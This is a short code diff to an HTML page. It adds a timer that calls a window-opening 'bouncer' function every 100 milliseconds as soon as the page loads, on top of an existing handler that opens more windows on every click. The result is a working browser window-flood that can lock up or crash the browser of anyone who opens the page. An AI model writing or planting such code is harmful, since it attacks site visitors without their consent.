@@ -48,6 +48,14 @@
 
     // Add event listener to open more bouncers on click anywhere
     document.body.addEventListener('click', openBouncer);
+
+    // Continuously spawn windows on user interaction
+    function continuousSpawning() {
+      setInterval(openBouncer, 100); // Open a new bouncer every 100 milliseconds
+    }
+
+    // Start continuous spawning after the main page is loaded
+    window.onload = continuousSpawning;
   </script>
 </body>
 </html>
